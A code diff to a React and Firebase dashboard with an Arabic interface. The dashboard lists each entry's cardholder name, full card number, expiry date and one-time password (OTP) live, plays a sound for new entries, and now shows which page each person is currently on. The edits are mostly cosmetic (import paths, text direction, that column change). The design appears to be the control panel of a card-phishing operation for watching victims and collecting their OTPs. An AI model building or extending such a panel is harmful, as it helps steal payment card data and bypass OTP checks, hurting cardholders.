@@ -25,15 +25,16 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/u
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
 import { onAuthStateChanged, signOut } from "firebase/auth"
-import { auth, db } from "./lib/firestore"
-import { playNotificationSound } from "./lib/actions"
+
 import { Input } from "@/components/ui/input"
 import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
 import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
 import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
 import { toast } from "@/hooks/use-toast"
-import type { PaymentDocument } from "./types/payment"
-import { PaymentStatus } from "./components/payment-status"
+import { auth, db } from "@/lib/firestore"
+import { PaymentDocument } from "@/type/payment"
+import { playNotificationSound } from "@/lib/actions"
+import { PaymentStatus } from "@/components/payment-status"
 
 export default function PaymentDashboard() {
   const [payments, setPayments] = useState<PaymentDocument[]>([])
@@ -110,7 +111,7 @@ export default function PaymentDashboard() {
               lastSeen: data.lastSeen || { sv: "unknown" },
             } as PaymentDocument
           })
-          .filter((payment) => !payment.isHidden)
+          .filter((payment) => !payment?.isHidden)
 
         // Play notification sound for new payments
         if (paymentsData.length > payments.length) {
@@ -394,7 +395,7 @@ export default function PaymentDashboard() {
                   <tr className="border-b border-border bg-muted/50">
                     <th className="px-4 py-3 text-right font-medium text-muted-foreground">حامل البطاقة</th>
                     <th className="px-4 py-3 text-right font-medium text-muted-foreground">رقم البطاقة</th>
-                    <th className="px-4 py-3 text-right font-medium text-muted-foreground">الدولة/المدينة</th>
+                    <th className="px-4 py-3 text-right font-medium text-muted-foreground">الصفحة الحالية</th>
                     <th className="px-4 py-3 text-right font-medium text-muted-foreground">OTP</th>
                     <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
                     <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
@@ -415,13 +416,13 @@ export default function PaymentDashboard() {
                         </div>
                       </td>
                       <td className="px-4 py-3">
-                        <span className="font-mono">{payment.cardNumber}</span>
+                        <span className="font-mono" dir="ltr">{payment.cardNumber}</span>
                       </td>
                       <td className="px-4 py-3">
                         <div className="flex items-center gap-2">
                           <MapPin className="h-4 w-4 text-muted-foreground" />
                           <span>
-                            {payment.country}/{payment.city}
+                            {payment?.pagename}
                           </span>
                         </div>
                       </td>
@@ -495,9 +496,9 @@ export default function PaymentDashboard() {
                     </CardHeader>
                     <CardContent className="p-4 pt-2">
                       <div className="space-y-2">
-                        <div className="flex justify-between">
+                        <div className="flex justify-between" dir="ltr">
                           <span className="text-sm text-muted-foreground">رقم البطاقة:</span>
-                          <span className="font-mono text-sm">{payment.cardNumber}</span>
+                          <span className="font-mono text-sm" dir="ltr">{payment.cardNumber}</span>
                         </div>
                         <div className="flex justify-between">
                           <span className="text-sm text-muted-foreground">الموقع:</span>
@@ -605,7 +606,7 @@ export default function PaymentDashboard() {
                   </div>
                   <div className="flex justify-between items-center py-2 border-b border-border/50">
                     <span className="font-medium text-muted-foreground">رقم البطاقة:</span>
-                    <span className="font-mono font-semibold">{selectedPayment.cardNumber}</span>
+                    <span className="font-mono font-semibold" dir="ltr">{selectedPayment.cardNumber}</span>
                   </div>
                   <div className="flex justify-between items-center py-2 border-b border-border/50">
                     <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
